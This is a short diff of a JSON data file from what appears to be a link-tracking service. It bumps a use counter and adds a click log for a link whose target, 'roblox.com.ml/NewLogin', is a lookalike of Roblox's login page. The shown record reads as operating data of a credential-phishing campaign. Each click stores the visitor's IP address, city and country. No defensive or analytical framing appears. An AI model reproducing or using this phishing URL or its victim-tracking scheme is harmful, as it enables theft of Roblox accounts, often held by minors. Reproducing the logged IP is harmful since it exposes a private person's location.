@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 268,
+    "useCount": 269,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2251,6 +2251,14 @@
       },
       {
         "timestamp": 1777005066184,
+        "ip": "73.96.110.3",
+        "country": "United States",
+        "city": "Vancouver",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777005125705,
         "ip": "73.96.110.3",
         "country": "United States",
         "city": "Vancouver",
